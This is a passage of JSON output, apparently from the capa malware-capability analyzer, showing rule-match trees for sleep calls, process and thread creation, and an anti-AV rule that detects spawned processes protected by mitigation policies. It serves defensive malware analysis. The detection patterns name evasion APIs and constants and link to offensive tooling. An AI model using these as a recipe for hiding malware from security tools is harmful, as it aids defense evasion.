                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RegisterWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitOnAddress"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtDelayExecution"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeDelayExecutionThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442470390
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "usleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "Sleep"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442470392
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SleepEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SignalObjectAndWait"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObjectEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RegisterWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitOnAddress"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtDelayExecution"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeDelayExecutionThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442471360
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "sleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "usleep"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "Sleep"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442471365
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SleepEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SignalObjectAndWait"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForSingleObjectEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RegisterWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WaitOnAddress"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjects"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "MsgWaitForMultipleObjectsEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtDelayExecution"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeWaitForSingleObject"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "KeDelayExecutionThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "create process on Windows": {
        "meta": {
          "name": "create process on Windows",
          "namespace": "host-interaction/process/create",
          "authors": [
            "moritz.raabe@mandiant.com"
          ],
          "scopes": {
            "static": "basic block",
            "dynamic": "call"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Process",
                "Create Process"
              ],
              "objective": "Process",
              "behavior": "Create Process",
              "method": "",
              "id": "C0017"
            }
          ],
          "references": [],
          "examples": [
            "9324D1A8AE37A36AE560C37448C9705A:0x406DB0",
            "Practical Malware Analysis Lab 01-04.exe_:0x4011FC",
            "692f7fd6d198e804d6af98eb9e390d61:0x6000003"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: create process on Windows\r\n    namespace: host-interaction/process/create\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n    scopes:\r\n      static: basic block\r\n      dynamic: call\r\n    mbc:\r\n      - Process::Create Process [C0017]\r\n    examples:\r\n      - 9324D1A8AE37A36AE560C37448C9705A:0x406DB0\r\n      - Practical Malware Analysis Lab 01-04.exe_:0x4011FC\r\n      - 692f7fd6d198e804d6af98eb9e390d61:0x6000003\r\n  features:\r\n    - or:\r\n      - api: kernel32.WinExec\r\n      - api: kernel32.CreateProcess\r\n      - api: shell32.ShellExecute\r\n      - api: shell32.ShellExecuteEx\r\n      - api: advapi32.CreateProcessAsUser\r\n      - api: advapi32.CreateProcessWithLogon\r\n      - api: advapi32.CreateProcessWithToken\r\n      - api: kernel32.CreateProcessInternal\r\n      - api: ntdll.NtCreateUserProcess\r\n      - api: ntdll.NtCreateProcess\r\n      - api: ntdll.NtCreateProcessEx\r\n      - api: ntdll.ZwCreateProcess\r\n      - api: ZwCreateProcessEx\r\n      - api: ntdll.ZwCreateUserProcess\r\n      - api: ntdll.RtlCreateUserProcess\r\n      - api: System.Diagnostics.Process::Start\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442467776
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "WinExec"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateProcess"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442468263
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ShellExecute"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ShellExecuteEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateProcessAsUser"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateProcessWithLogon"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateProcessWithToken"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "CreateProcessInternal"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateUserProcess"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateProcess"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "NtCreateProcessEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateProcess"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateProcessEx"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "ZwCreateUserProcess"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "RtlCreateUserProcess"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.Diagnostics.Process::Start"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "protect spawned processes with mitigation policies": {
        "meta": {
          "name": "protect spawned processes with mitigation policies",
          "namespace": "anti-analysis/anti-av",
          "authors": [
            "jakub.jozwiak@mandiant.com"
          ],
          "scopes": {
            "static": "basic block",
            "dynamic": "call"
          },
          "attack": [
            {
              "parts": [
                "Defense Evasion",
                "Impair Defenses",
                "Disable or Modify Tools"
              ],
              "tactic": "Defense Evasion",
              "technique": "Impair Defenses",
              "subtechnique": "Disable or Modify Tools",
              "id": "T1562.001"
            }
          ],
          "mbc": [
            {
              "parts": [
                "Defense Evasion",
                "Disable or Evade Security Tools",
                "Modify Policy"
              ],
              "objective": "Defense Evasion",
              "behavior": "Disable or Evade Security Tools",
              "method": "Modify Policy",
              "id": "F0004.005"
            }
          ],
          "references": [
            "https://blog.xpnsec.com/protecting-your-malware/",
            "https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/blockdlls_acg_ppid_spoof_bin.nim"
          ],
          "examples": [
            "2ebadd04f0ada89c36c1409b6e96423a68dd77b513db8db3da203c36d3753e5f:0x140002120"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: protect spawned processes with mitigation policies\r\n    namespace: anti-analysis/anti-av\r\n    authors:\r\n      - jakub.jozwiak@mandiant.com\r\n    scopes:\r\n      static: basic block\r\n      dynamic: call\r\n    att&ck:\r\n      - Defense Evasion::Impair Defenses::Disable or Modify Tools [T1562.001]\r\n    mbc:\r\n      - Defense Evasion::Disable or Evade Security Tools::Modify Policy [F0004.005]\r\n    references:\r\n      - https://blog.xpnsec.com/protecting-your-malware/\r\n      - https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/blockdlls_acg_ppid_spoof_bin.nim\r\n    examples:\r\n      - 2ebadd04f0ada89c36c1409b6e96423a68dd77b513db8db3da203c36d3753e5f:0x140002120\r\n  features:\r\n    - and:\r\n      - api: UpdateProcThreadAttribute\r\n      - number: 0x20007 = PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY\r\n      - or:\r\n        - number: 0x1000000000 = PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON\r\n        - number: 0x100000000000 = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON\r\n        - number: 0x300000000000 = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE\r\n        - number: 0x101000000000\r\n        - number: 0x301000000000\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442467776
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "and"
                }
              },
              "children": [
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "UpdateProcThreadAttribute"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442468178
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "number",
                      "number": 131079,
                      "description": "PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY"
                    }
                  },
                  "children": [],
                  "locations": [
                    {
                      "type": "absolute",
                      "value": 6442468165
                    }
                  ],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "or"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "number",
                          "number": 68719476736,
                          "description": "PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "number",
                          "number": 17592186044416,
                          "description": "PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "absolute",
                          "value": 6442468126
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "number",
                          "number": 52776558133248,
                          "description": "PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "number",
                          "number": 17660905521152
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "number",
                          "number": 52845277609984
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "create thread": {
        "meta": {
          "name": "create thread",
          "namespace": "host-interaction/thread/create",
          "authors": [
            "moritz.raabe@mandiant.com",
            "michael.hunhoff@mandiant.com",
            "joakim@intezer.com",
            "anushka.virgaonkar@mandiant.com"
          ],
          "scopes": {
            "static": "basic block",
            "dynamic": "span of calls"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "Process",
                "Create Thread"
              ],
              "objective": "Process",
              "behavior": "Create Thread",
              "method": "",
              "id": "C0038"
            }
          ],
          "references": [],
          "examples": [
            "946A99F36A46D335DEC080D9A4371940:0x10001DA0",
            "B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x408020"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: create thread\r\n    namespace: host-interaction/thread/create\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - michael.hunhoff@mandiant.com\r\n      - joakim@intezer.com\r\n      - anushka.virgaonkar@mandiant.com\r\n    scopes:\r\n      static: basic block\r\n      dynamic: span of calls\r\n    mbc:\r\n      - Process::Create Thread [C0038]\r\n    examples:\r\n      - 946A99F36A46D335DEC080D9A4371940:0x10001DA0\r\n      - B5F85C26D7AA5A1FB4AF5821B6B5AB9B:0x408020\r\n  features:\r\n    - or:\r\n      - and:\r\n        - os: windows\r\n        - or:\r\n          - api: kernel32.CreateThread\r\n          - api: _beginthread\r\n          - api: _beginthreadex\r\n          - api: PsCreateSystemThread\r\n          - api: SHCreateThread\r\n          - api: SHCreateThreadWithHandle\r\n          - api: kernel32.CreateRemoteThread\r\n          - api: kernel32.CreateRemoteThreadEx\r\n          - api: RtlCreateUserThread\r\n          - api: ntdll.NtCreateThread\r\n          - api: ntdll.NtCreateThreadEx\r\n          - api: ntdll.ZwCreateThread\r\n          - api: ntdll.ZwCreateThreadEx\r\n      - and:\r\n        - or:\r\n          - os: linux\r\n          - os: android\r\n        - api: pthread_create\r\n      - and:\r\n        - api: System.Threading.Thread::Start\r\n        - optional:\r\n          - api: System.Threading.Thread::ctor\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 6442468837
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "linux"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "os",
                              "os": "android"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "pthread_create"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "api",
                          "api": "System.Threading.Thread::Start"
                        }
                      },
                      "children": [],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "System.Threading.Thread::ctor"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "CreateThread"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 6442468877
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_beginthread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_beginthreadex"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "PsCreateSystemThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SHCreateThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "SHCreateThreadWithHandle"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "CreateRemoteThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "CreateRemoteThreadEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "RtlCreateUserThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtCreateThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtCreateThreadEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwCreateThread"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwCreateThreadEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 6442471312
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": false,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
